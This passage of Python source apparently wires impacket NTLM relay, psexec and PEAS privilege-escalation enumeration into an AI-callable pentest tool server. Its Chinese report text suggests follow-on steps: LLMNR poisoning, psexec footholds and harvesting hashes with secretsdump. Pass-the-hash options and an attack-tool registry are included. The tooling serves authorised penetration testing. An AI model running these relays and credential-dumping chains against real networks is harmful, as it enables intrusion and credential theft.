    def validate_targets(cls, v: str) -> str:
        parts = _split_targets(v)
        if not parts:
            raise ValueError("at least one relay target is required")
        for t in parts:
            if t in ("*", "all", "0.0.0.0"):
                raise ValueError("wildcard targets are not allowed")
            if not _is_valid_target(t):
                raise ValueError(f"invalid relay target: {t!r}")
        return v

    @field_validator("domain")
    @classmethod
    def validate_domain(cls, v: str) -> str:
        return _validate_domain(v)

    @field_validator("interface_ip")
    @classmethod
    def validate_interface_ip(cls, v: str) -> str:
        if v:
            _no_shell_meta(v)
        return v

    @field_validator("command")
    @classmethod
    def validate_command(cls, v: str) -> str:
        v = v.strip()
        if any(c in v for c in "\r\n\x00"):
            raise ValueError("command must not contain control characters")
        return v


def _ntlmrelayx_cmd(p: NtlmrelayxInput) -> list[str]:
    cmd = ["impacket-ntlmrelayx"]
    for t in _split_targets(p.targets):
        cmd.extend(["-t", t])
    if p.interface_ip:
        cmd.extend(["-ip", p.interface_ip])
    cmd.extend(["--smb-port", str(p.smb_port)])
    if p.smb2support:
        cmd.append("-smb2support")
    # Bounded listener surface: SMB + raw (LLMNR/NBNS) only, by default.
    if not p.enable_http:
        cmd.append("--no-http-server")
    for off in ("--no-wcf-server", "--no-winrm-server", "--no-rpc-server"):
        cmd.append(off)
    if p.socks:
        cmd.append("-socks")
    if p.command:
        cmd.extend(["-c", p.command])
    if p.enum_local_admins:
        cmd.append("--enum-local-admins")
    if p.keep_relaying:
        cmd.append("--keep-relaying")
    if p.domain:
        cmd.extend(["-domain", p.domain])
    return cmd


#: ntlmrelayx event lines worth surfacing (startup noise like
#: "Serving SMB..." / "Sniffing on" is deliberately excluded)
_RELAY_EVENT_RE = re.compile(
    r"^\[[*\!+-]\]\s*(Connection from|Relaying|Executing|Attacking|"
    r"Anonymous SMB|No valid|Unable|Authenticated|Hashes|LAP|LNR|NBT)",
    re.I,
)


def _ntlmrelayx_report(
    p: NtlmrelayxInput, stdout: str, duration: float
) -> str:
    lines = [
        "## 🕸 impacket-ntlmrelayx NTLM 中继",
        f"**中继目标:** {p.targets} | **监听:** SMB:{p.smb_port} + raw(LLMNR/NBNS) | **耗时:** {duration:.0f}s",
        "",
    ]
    events = [
        _ANSI_RE.sub("", l).strip()
        for l in stdout.splitlines()
        if _RELAY_EVENT_RE.match(l.strip())
    ]
    if events:
        lines.extend(["### 📡 中继事件", ""])
        for e in events[: p.max_results]:
            lines.append(f"- {e}")
        if len(events) > p.max_results:
            lines.append(f"… 另有 {len(events) - p.max_results} 条事件未显示")
    else:
        lines.append("⚠️ 窗口期内无成功中继（正常情况——需要目标主动向本机发起 SMB/LLMNR 认证）。")
        last = _ANSI_RE.sub("", stdout).strip().splitlines()
        if last:
            lines.append(f"\n> 最后状态：`{last[-1][:160]}`")
    lines.extend(
        [
            "",
            "> 后续建议：无 `-c` 时中继主要用于会话劫持/SOCKS 隧道；",
            "> 配合 `responder_run` 的 LLMNR 投毒提高命中率；确认命中后转 `impacket_psexec` 落地。",
        ]
    )
    return "\n".join(lines)


async def impacket_ntlmrelayx(p: NtlmrelayxInput) -> str:
    """Relay captured NTLM authentications to target hosts (🔴).

    Listens for SMB (and LLMNR/NBNS name resolutions via the raw server)
    and relays valid NTLM authentications to the given targets — turning
    a victim's own credentials into access on another machine. The
    listener surface is bounded to SMB + raw by default (HTTP/WCF/RPC/
    WinRM servers off unless enable_http).

    ⚠️ Active MITM on your network segment. Only run inside authorized
    lab networks.

    Requires: impacket (Kali 预装 python3-impacket)
    """
    executor = get_executor(timeout=p.wall_timeout)
    cmd = _ntlmrelayx_cmd(p)
    t0 = time.monotonic()
    # impacket shebang is #!/usr/bin/env python — under the
    # systemd service PATH the venv python shadows the system one and
    # hides the impacket package; pin a pure system PATH for subprocesses.
    result = await executor.run(cmd, timeout=p.wall_timeout, env=_IMPACKT_ENV)
    duration = time.monotonic() - t0
    # ntlmrelayx streams events to stdout; a clean timeout/stop still
    # counts as a (possibly empty) capture window.
    return _ntlmrelayx_report(p, result.stdout or result.stderr or "", duration)


# ===================================================================
# 🟡 6. peas_linux — local privesc enumeration (LinPEAS-ng)
# ===================================================================

#: LinPEAS-ng payload location (Kali apt package `peass`).

#: impacket binaries use `#!/usr/bin/env python`; pin a venv-free PATH so
#: `env python` resolves to /usr/bin/python (system, has impacket) instead of
#: the venv python when the service PATH is venv-first.
_IMPACKT_ENV = {"PATH": "/usr/sbin:/usr/bin:/sbin:/bin"}

_LINPEAS_PATH = "/usr/share/peass/linpeas/linpeas.sh"
#: winpeas payloads by arch (Kali apt package `peass`).
_WINPEAS_EXE = {
    "x64": "winPEASx64.exe",
    "x86": "winPEASx86.exe",
    "any": "winPEASany.exe",
}
_WINPEAS_DIR = "/usr/share/peass/winpeas"


class PeasLinuxInput(BaseModel):
    """Input for local privesc enumeration with linpeas."""

    stealth: bool = Field(
        default=True,
        description="Stealth & faster mode (-s: skip time-consuming checks)",
    )
    all_checks: bool = Field(default=False, description="Perform all checks (-a; adds ~1 min)")
    extra: bool = Field(default=False, description="Perform extra enumeration (-e)")
    checks: str = Field(
        default="",
        description="Only run selected checks (-o), comma-separated from: system_information, container, cloud, procs_crons_timers_srvcs_sockets, network_information, users_information, software_information, interesting_perms_files, interesting_files, api_keys_regex",
        max_length=512,
    )
    mitre: str = Field(
        default="",
        description="Only checks matching MITRE ATT&CK technique IDs (-T), e.g. 'T1057,T1082'",
        max_length=256,
    )
    wall_timeout: int = Field(default=300, ge=30, le=1800, description="Overall wall-clock timeout in seconds")
    max_lines: int = Field(default=300, ge=50, le=4000, description="Max raw output lines rendered at the tail")

    @field_validator("checks")
    @classmethod
    def validate_checks(cls, v: str) -> str:
        for name in _split_targets(v):
            if name not in _PEAS_CHECK_NAMES:
                raise ValueError(f"unknown check name: {name!r}")
        return v

    @field_validator("mitre")
    @classmethod
    def validate_mitre(cls, v: str) -> str:
        for tok in _split_targets(v):
            if not re.match(r"^T\d{4}$", tok):
                raise ValueError(f"invalid MITRE technique id: {tok!r} (expected T1057)")
        return v


def _peas_linux_cmd(p: PeasLinuxInput) -> list[str]:
    cmd = ["bash", _LINPEAS_PATH]
    # NOTE: -N (no colours) is deliberately NOT used — it suppresses the
    # ESC[1;31m red / ESC[33m yellow markers that identify the "95% PE vector"
    # findings, which is exactly what this tool reports (verified live:
    # with -N → 0 red findings; without → hundreds of red lines).
    cmd.extend(["-q"])  # no banner only
    if p.stealth:
        cmd.append("-s")
    if p.all_checks:
        cmd.append("-a")
    if p.extra:
        cmd.append("-e")
    if p.checks:
        cmd.extend(["-o", ",".join(_split_targets(p.checks))])
    if p.mitre:
        cmd.extend(["-T", ",".join(_split_targets(p.mitre))])
    return cmd


def _peas_parse(stdout: str) -> tuple[list[str], list[str], list[str]]:
    """Return (sections, red_findings, yellow_findings) from LinPEAS-ng output."""
    sections: list[str] = []
    red: list[str] = []
    yellow: list[str] = []
    for raw in stdout.splitlines():
        m = _PEAS_SECTION_RE.search(raw)
        if m:
            sections.append(_ANSI_RE.sub("", m.group(1)).strip())
            continue
        if not raw.strip():
            continue
        if _PEAS_BOLD_RED_RE.search(raw):
            red.append(_ANSI_RE.sub("", raw).strip())
        elif _PEAS_YELLOW_RE.search(raw):
            yellow.append(_ANSI_RE.sub("", raw).strip())
    return sections, red, yellow


def _peas_linux_report(
    p: PeasLinuxInput,
    stdout: str,
    returncode: int,
    duration: float,
) -> str:
    sections, red, yellow = _peas_parse(stdout)
    lines = [
        "## 🐑 linpeas 本地提权枚举（LinPEAS-ng）",
        f"**模式:** {'stealth 快速' if p.stealth else '完整'}"
        + (" +all" if p.all_checks else "")
        + (" +extra" if p.extra else ""),
        f"**耗时:** {duration:.0f}s | **分节:** {len(sections)}",
        "",
    ]
    red, yellow = _peas_rank(red), _peas_rank(yellow)
    if red:
        lines.append(f"🔴 **{len(red)} 个高置信提权向量**（LinPEAS 图例：红/黄 = 95% PE vector，按关键词热度排序）")
        lines.append("")
        for r in red[:50]:
            lines.append(f"- {r}")
        if len(red) > 50:
            lines.append(f"… 另有 {len(red) - 50} 条未显示")
    if yellow:
        lines.append(f"\n🟡 **{len(yellow)} 个需人工确认项**（黄色）")
        for y in yellow[:20]:
            lines.append(f"- {y}")
        if len(yellow) > 20:
            lines.append(f"… 另有 {len(yellow) - 20} 条未显示")
    if not red and not yellow:
        lines.append("✅ 未发现红/黄色高亮项（不代表绝对安全——见下方原始输出）。")
    if sections:
        lines.append("\n### 分节")
        lines.append(" · ".join(sections))
    tail = _ANSI_RE.sub("", stdout).splitlines()[-p.max_lines :]
    lines.extend(["", "### 原始输出（尾部）", "```", *tail, "```"])
    lines.append("")
    lines.append("> 后续建议：红色项逐一手动复核（SUID/CVE 号已标注）；内核漏洞先确认发行版与 CVE 影响范围再动手。")
    return "\n".join(lines)


async def peas_linux(p: PeasLinuxInput) -> str:
    """Enumerate local privilege-escalation vectors on the MCP host (linpeas).

    Runs LinPEAS-ng locally: SUID/SGID binaries with known CVEs, sudo
    misconfigs, writable cron paths, interesting file permissions,
    users/groups, kernel & package inventory. Read-only enumeration —
    it does not execute any privilege escalation.

    Output is color-coded: RED = "95% a PE vector" (the report surfaces
    these first), YELLOW = needs a look. The tail of the raw output is
    included for follow-up.

    Requires: Kali apt package `peass` (provides /usr/share/peass/linpeas/linpeas.sh)
    """
    executor = get_executor(timeout=p.wall_timeout)
    cmd = _peas_linux_cmd(p)
    t0 = time.monotonic()
    result = await executor.run(cmd, timeout=p.wall_timeout)
    duration = time.monotonic() - t0

    if not result.stdout:
        diag = (result.stderr or "")[:500]
        return (
            "## 🐑 linpeas 本地提权枚举\n\n"
            f"❌ linpeas 执行失败（exit {result.returncode}）。\n\n"
            f"```\n{diag}\n```\n\n"
            "💡 若未安装：`sudo apt install peass -y`"
        )

    return _peas_linux_report(p, result.stdout, result.returncode, duration)


# ===================================================================
# 🟡 7. peas_windows — remote privesc enumeration (winpeas via psexec -c)
# ===================================================================


class PeasWindowsInput(BaseModel):
    """Input for remote privesc enumeration on a Windows host (winpeas)."""

    target: str = Field(..., description="Target Windows host", max_length=256)
    domain: str = Field(default="", description="Domain (optional)")
    username: str = Field(default="", description="Username (valid account on the target; local admin not required for enumeration)")
    password: str = Field(default="", description="Password (masked in reports)")
    hashes: str = Field(default="", description="Pass-the-hash: LM:NT (32 hex each) instead of password")
    arch: str = Field(default="x64", description="winpeas binary: x64 | x86 | any")
    silent: bool = Field(default=True, description="winpeas -s (no colours, faster)")
    all_checks: bool = Field(default=False, description="winpeas -a (include slow checks)")
    target_ip: str = Field(default="", description="Explicit IP (unresolvable NetBIOS names)")
    wall_timeout: int = Field(default=300, ge=30, le=1800, description="Overall wall-clock timeout in seconds")
    max_lines: int = Field(default=300, ge=50, le=4000, description="Max raw output lines rendered at the tail")

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        return _validate_target(v)

    @field_validator("domain")
    @classmethod
    def validate_domain(cls, v: str) -> str:
        return _validate_domain(v)

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: str) -> str:
        return _validate_username(v)

    @field_validator("password")
    @classmethod
    def validate_password(cls, v: str) -> str:
        return _validate_password(v)

    @field_validator("hashes")
    @classmethod
    def validate_hashes(cls, v: str) -> str:
        return _validate_hashes(v)

    @field_validator("arch")
    @classmethod
    def validate_arch(cls, v: str) -> str:
        v = v.strip().lower()
        if v not in _WINPEAS_EXE:
            raise ValueError("arch must be x64 | x86 | any")
        return v

    @model_validator(mode="after")
    def check_creds(self) -> "PeasWindowsInput":
        if self.username and not (self.password or self.hashes):
            raise ValueError("username requires password or hashes (no interactive prompt)")
        return self


def _peas_windows_cmd(p: PeasWindowsInput) -> list[str]:
    exe = _WINPEAS_EXE[p.arch]
    local = f"{_WINPEAS_DIR}/{exe}"
    remote_args = " ".join(
        filter(None, [exe, "-s" if p.silent else None, "-a" if p.all_checks else None])
    )
    cmd = ["impacket-psexec", "-c", local]
    if not p.username:
        cmd.append("-no-pass")
    cmd.extend(_hashes_flag(p.hashes))
    if p.target_ip:
        cmd.extend(["-target-ip", p.target_ip])
    cmd.append(_creds_target(p.target, p.domain, p.username, p.password))
    cmd.append(remote_args)
    return cmd


def _peas_windows_report(
    p: PeasWindowsInput,
    stdout: str,
    returncode: int,
    duration: float,
) -> str:
    clean = _ANSI_RE.sub("", stdout).strip()
    lines = [
        "## 🐑 winpeas 远程提权枚举",
        f"**目标:** {p.target} | **架构:** {p.arch} | **退出码:** {returncode} | **耗时:** {duration:.0f}s",
        "",
        f"ℹ️ winpeas.exe 已通过 psexec -c 暂存到目标临时目录（无自动清理）。",
        "",
    ]
    if clean:
        shown = clean.splitlines()[-p.max_lines :]
        lines.extend(["### 输出（尾部）", "```", *shown, "```"])
    else:
        lines.append("⚠️ 无输出（认证失败 / 凭据权限不足 / 目标非 Windows）。")
    lines.append("")
    lines.append("> 后续建议：核对 winpeas 标注的 CVE/配置项后，用 `impacket_psexec` 验证提权路径；哈希用 `impacket_secretsdump` 收割。")
    return "\n".join(lines)


async def peas_windows(p: PeasWindowsInput) -> str:
    """Enumerate privilege-escalation vectors on a Windows host (winpeas, 🟡).

    Stages winpeas.exe to the target via `impacket-psexec -c` and runs it
    with -s (silent) — users/groups, services, scheduled tasks, kernel
    CVEs, token privileges. Enumeration only; it does not execute any
    privesc. Requires a valid account on the target (local admin NOT
    required for most checks).

    Note: the staged binary is left in the target's temp directory
    (psexec -c does not auto-clean).

    Requires: impacket + Kali apt package `peass`
    """
    executor = get_executor(timeout=p.wall_timeout)
    cmd = _peas_windows_cmd(p)
    t0 = time.monotonic()
    # impacket shebang is #!/usr/bin/env python — under the
    # systemd service PATH the venv python shadows the system one and
    # hides the impacket package; pin a pure system PATH for subprocesses.
    result = await executor.run(cmd, timeout=p.wall_timeout, env=_IMPACKT_ENV)
    duration = time.monotonic() - t0

    if not result.stdout:
        diag = (result.stderr or "")[:500]
        return (
            "## 🐑 winpeas 远程提权枚举\n"
            f"**目标:** {p.target} | **命令:** `{_masked_cmd(cmd, p.password)}`\n\n"
            f"❌ winpeas 执行失败（exit {result.returncode}）。\n\n"
            f"```\n{diag}\n```\n\n"
            "💡 常见原因：凭据无效 / 目标不是 Windows / 445 被拦截。"
        )

    return _peas_windows_report(p, result.stdout, result.returncode, duration)


# ===================================================================
# Registry
# ===================================================================

#: 🟡 AD/privesc enumeration — PENTEST_ENABLED
AD_PENTEST_TOOLS: dict[str, tuple[callable, type[BaseModel]]] = {
    "impacket_lookupsid": (impacket_lookupsid, LookupsidInput),
    "peas_linux": (peas_linux, PeasLinuxInput),
    "peas_windows": (peas_windows, PeasWindowsInput),
}

#: 🔴 AD/privesc attacks — ATTACK_ENABLED
AD_ATTACK_TOOLS: dict[str, tuple[callable, type[BaseModel]]] = {
    "impacket_secretsdump": (impacket_secretsdump, SecretsdumpInput),
    "impacket_dcsync": (impacket_dcsync, DcsyncInput),
    "impacket_psexec": (impacket_psexec, PsexecInput),
    "impacket_ntlmrelayx": (impacket_ntlmrelayx, NtlmrelayxInput),
}
